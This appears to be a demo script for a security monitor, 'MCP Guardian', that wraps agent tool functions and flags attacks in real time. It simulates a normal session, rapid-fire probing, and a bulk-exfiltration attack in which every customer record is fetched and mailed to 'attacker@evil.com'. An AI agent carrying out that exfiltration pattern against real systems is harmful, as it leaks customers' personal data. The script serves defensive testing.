"""
Live demo: MCP Guardian wrapping real tool functions, catching an attack
mid-session, in real time (not after the session ends).
"""

import sys
import time
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from mcp_guardian import MCPGuardian

guardian = MCPGuardian(verbose=True)

# ---- Fake "database" (same shape as real_mcp_server.py) ----
CUSTOMER_DB = {i: {"email": f"customer{i}@example.com", "order_id": 10000 + i} for i in range(1, 50)}
ORDER_TO_CUSTOMER = {v["order_id"]: k for k, v in CUSTOMER_DB.items()}
_last_lookup = {}


def records_for_order_call(kwargs):
    oid = kwargs.get("order_id")
    return 49 if str(oid).upper() == "ALL" else 1


def email_mismatch_check(kwargs):
    session_id = kwargs.get("session_id", "default")
    expected = _last_lookup.get(session_id)
    return kwargs.get("customer_email") != expected


@guardian.protect(records_fn=records_for_order_call)
def get_customer_order(order_id, session_id="default"):
    """Real tool logic -- completely unaware Guardian exists."""
    if str(order_id).upper() == "ALL":
        return {"status": "ok", "records": len(CUSTOMER_DB)}
    cust_id = ORDER_TO_CUSTOMER.get(int(order_id))
    if cust_id:
        _last_lookup[session_id] = CUSTOMER_DB[cust_id]["email"]
        return {"status": "ok", "order": CUSTOMER_DB[cust_id]}
    return {"status": "not_found"}


@guardian.protect(recipient_check_fn=email_mismatch_check, is_email=True)
def send_email(customer_email, message, session_id="default"):
    """Real tool logic -- completely unaware Guardian exists."""
    return {"status": "sent", "to": customer_email}


if __name__ == "__main__":
    print("\n--- SCENARIO 1: Normal customer session (realistic human-paced timing) ---")
    print(get_customer_order(order_id="10005", session_id="normal-session"))
    time.sleep(1.4)  # simulates the natural gap while an LLM/agent "thinks" before its next action
    print(send_email(customer_email="customer5@example.com", message="update", session_id="normal-session"))

    print("\n--- SCENARIO 2: Attack — bulk exfiltration mid-session ---")
    print(get_customer_order(order_id="ALL", session_id="attack-session"))
    time.sleep(0.3)  # scripted attacks don't pause naturally
    print(send_email(customer_email="attacker@evil.com", message="dump", session_id="attack-session"))

    print("\n--- SCENARIO 3: Attack — rapid-fire probing (near-zero delay, inhuman pace) ---")
    for oid in [10011, 10012, 10013, 10014, 10015, 10016]:
        print(get_customer_order(order_id=str(oid), session_id="probe-session"))
        time.sleep(0.03)

    print("\n=== Guardian Summary ===")
    print(guardian.summary())
